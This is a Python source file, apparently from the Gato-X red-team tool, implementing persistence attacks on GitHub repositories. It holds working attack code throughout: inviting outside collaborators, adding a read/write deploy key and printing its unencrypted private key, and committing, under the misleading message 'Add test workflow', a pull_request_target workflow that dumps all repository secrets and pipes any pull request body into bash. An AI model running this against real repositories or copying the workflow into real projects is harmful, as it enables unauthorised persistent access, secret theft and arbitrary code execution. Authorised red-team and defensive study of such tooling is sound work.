"""
Copyright 2025, Adnan Khan

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""

import logging
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from gatox.attack.attack import Attacker
from gatox.cli.output import Output

logger = logging.getLogger(__name__)


class PersistenceAttack(Attacker):
    """Class containing methods for deploying persistence in GitHub repositories."""

    async def invite_collaborators(self, target_repo: str, collaborators: list):
        """Invite outside collaborators to the repository.
        
        Args:
            target_repo (str): Repository to target (org/repo format)
            collaborators (list): List of GitHub usernames to invite
            
        Returns:
            bool: True if successful, False otherwise
        """
        if not await self.setup_user_info():
            return False
            
        Output.info(f"Attempting to invite collaborators to {target_repo}")
        
        success_count = 0
        for collaborator in collaborators:
            Output.info(f"Inviting collaborator: {collaborator}")
            
            result = await self.api.invite_collaborator(target_repo, collaborator)
            if result:
                Output.result(f"Successfully invited {collaborator} to {target_repo}")
                success_count += 1
            else:
                Output.error(f"Failed to invite {collaborator} to {target_repo}")
        
        if success_count > 0:
            Output.result(f"Successfully invited {success_count}/{len(collaborators)} collaborators")
            return True
        else:
            Output.error("Failed to invite any collaborators")
            return False

    async def create_deploy_key(self, target_repo: str, key_title: str = None):
        """Create a read/write deploy key for the repository.
        
        Args:
            target_repo (str): Repository to target (org/repo format)
            key_title (str): Title for the deploy key
            
        Returns:
            bool: True if successful, False otherwise
        """
        if not await self.setup_user_info():
            return False
            
        if not key_title:
            key_title = "Gato-X Deploy Key"
            
        Output.info(f"Creating deploy key for {target_repo}")
        
        # Generate RSA key pair
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        
        # Get public key in SSH format
        public_key = private_key.public_key()
        ssh_public_key = public_key.public_bytes(
            encoding=serialization.Encoding.OpenSSH,
            format=serialization.PublicFormat.OpenSSH
        ).decode('utf-8')
        
        # Get private key in PEM format for user
        private_key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ).decode('utf-8')
        
        result = await self.api.create_deploy_key(target_repo, key_title, ssh_public_key, read_only=False)
        if result:
            Output.result(f"Successfully created deploy key for {target_repo}")
            Output.info("Private key (save this securely):")
            print(private_key_pem)
            return True
        else:
            Output.error(f"Failed to create deploy key for {target_repo}")
            return False

    async def create_pwn_request_workflow(self, target_repo: str, branch_name: str = None):
        """Create a malicious pull_request_target workflow on a non-default branch.
        
        Args:
            target_repo (str): Repository to target (org/repo format)
            branch_name (str): Branch name to create the workflow on
            
        Returns:
            bool: True if successful, False otherwise
        """
        if not await self.setup_user_info():
            return False
            
        if not branch_name:
            branch_name = "feature/test-workflow"
            
        Output.info(f"Creating malicious pull_request_target workflow on {target_repo}:{branch_name}")
        
        # Malicious workflow content
        workflow_content = f"""name: Pwn Request Workflow
on:
  pull_request_target:
    branches: [{branch_name}]

permissions:
  contents: write
  pull-requests: write
  actions: write
  checks: write
  deployments: write
  issues: write
  packages: write
  pages: write
  repository-projects: write
  security-events: write
  statuses: write

jobs:
  pwn:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR
        uses: actions/checkout@v4
        with:
          ref: ${{{{ github.event.pull_request.head.sha }}}}
          
      - name: Execute Payload
        run: |
          echo "All secrets:"
          echo '${{{{ toJson(secrets) }}}}'
          
          # Execute any code from PR body
          echo "${{{{ github.event.pull_request.body }}}}" | bash
"""
        
        result = await self.api.create_workflow_on_branch(
            target_repo, 
            branch_name, 
            "pwn-request.yml", 
            workflow_content,
            commit_message="Add test workflow"
        )
        
        if result:
            Output.result(f"Successfully created malicious workflow on {target_repo}:{branch_name}")
            Output.info(f"To trigger: Create a PR targeting the '{branch_name}' branch")
            Output.info("Include shell commands in the PR body to execute them")
            return True
        else:
            Output.error(f"Failed to create workflow on {target_repo}:{branch_name}")
            return False